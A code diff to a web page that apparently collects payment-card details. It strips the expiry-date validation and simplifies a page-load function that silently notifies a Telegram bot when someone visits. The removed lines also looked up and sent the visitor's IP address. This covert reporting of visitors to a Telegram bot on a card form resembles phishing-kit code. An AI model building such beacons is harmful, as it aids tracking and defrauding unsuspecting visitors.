@@ -98,58 +98,21 @@
     </div>
 
     <script>
-        // Auto-insert slash in expiry date field
-        const expiryDateField = document.getElementById('expiryDate');
-        expiryDateField.addEventListener('input', (e) => {
-            let value = e.target.value.replace(/\D/g, ''); // Remove non-digit characters
-            if (value.length > 2) {
-                value = value.substring(0, 2) + '/' + value.substring(2, 4);
-            }
-            e.target.value = value;
-        });
-
-        // Validate expiry date
-        expiryDateField.addEventListener('blur', (e) => {
-            const value = e.target.value;
-            const [month, year] = value.split('/').map(Number);
-
-            const currentYear = new Date().getFullYear() % 100; // Get last two digits of the current year
-            const currentMonth = new Date().getMonth() + 1;
-
-            if (
-                !value.match(/^\d{2}\/\d{2}$/) || // Ensure format is MM/YY
-                month < 1 || month > 12 || // Ensure month is valid
-                (year < currentYear || (year === currentYear && month < currentMonth)) // Ensure date is not in the past
-            ) {
-                alert('Invalid expiry date. Please enter a valid future date in MM/YY format.');
-                e.target.value = '';
-            }
-        });
-
         // Function to notify Telegram when the user enters the site
-        async function notifyUserEntry() {
+        function notifyUserEntry() {
             const telegramBotToken = 'YOUR_BOT_TOKEN';  // Replace with your Telegram Bot Token
             const chatId = 'YOUR_CHAT_ID';  // Replace with your Telegram Chat ID
 
-            // Get the user's IP address using the Ipify API
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                const userIp = data.ip;
+            const message = 'A user has entered the website!';
 
-                const message = `A user with IP address ${userIp} has entered the website!`;
-
-                await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message,
-                    }),
-                });
-            } catch (error) {
-                console.error('Error fetching IP or sending message:', error);
-            }
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            });
         }
 
         // Call the function when the page is loaded
